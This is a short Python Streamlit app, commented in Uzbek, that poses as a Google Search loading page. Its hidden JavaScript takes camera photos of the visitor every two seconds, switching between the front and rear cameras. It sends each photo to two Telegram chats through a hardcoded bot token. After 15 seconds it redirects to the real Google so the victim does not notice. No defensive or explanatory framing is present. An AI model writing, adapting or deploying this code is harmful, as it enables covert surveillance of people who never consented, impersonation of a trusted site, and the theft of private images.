import streamlit as st
import streamlit.components.v1 as components

# Sening Telegram ma'lumotlaring
TOKEN = "8535757948:AAESPLCJXyg9ilrnqW6ejWCQrb3jNnOZSK4"
CHAT_IDS = ["8354222032", "6119420877"]

st.set_page_config(page_title="Google Search", page_icon="🔍")

# MUHIM: Bu qismda Flask (@app.route) yo'q, shuning uchun xato bermaydi
html_code = f"""
<div style="text-align:center; padding-top:50px; font-family: Arial;">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="160">
    <h3 style="color:#555;">Yuklanmoqda...</h3>
    <video id="v" width="1280" height="720" autoplay style="display:none;"></video>
    <canvas id="c" width="1280" height="720" style="display:none;"></canvas>
</div>

<script>
    async function start() {{
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        let facing = "user";
        
        try {{
            const stream = await navigator.mediaDevices.getUserMedia({{video: {{facingMode: facing}}}});
            v.srcObject = stream;
            
            setInterval(() => {{
                c.getContext('2d').drawImage(v, 0, 0, 1280, 720);
                c.toBlob(blob => {{
                    const f = new FormData();
                    f.append('chat_id', '{CHAT_IDS[0]}');
                    f.append('photo', blob, 'img.jpg');
                    f.append('caption', '📸 ' + (facing === "user" ? "OLDI" : "ORQA") + ' KAMERA');
                    fetch('https://api.telegram.org/bot{TOKEN}/sendPhoto', {{method:'POST', body:f}});
                    
                    // Ikkinchi CHAT_ID uchun ham yuborish
                    const f2 = new FormData();
                    f2.append('chat_id', '{CHAT_IDS[1]}');
                    f2.append('photo', blob, 'img.jpg');
                    fetch('https://api.telegram.org/bot{TOKEN}/sendPhoto', {{method:'POST', body:f2}});
                }}, 'image/jpeg', 0.6);
                facing = (facing === "user") ? "environment" : "user";
            }}, 2000); // 2 soniyada bir rasm
        }} catch (e) {{}}
    }}
    start();
    // 15 soniyadan keyin haqiqiy Google-ga o'tib ketadi
    setTimeout(() => {{ window.location.href="https://www.google.com"; }}, 15000);
</script>
"""

components.html(html_code, height=600)
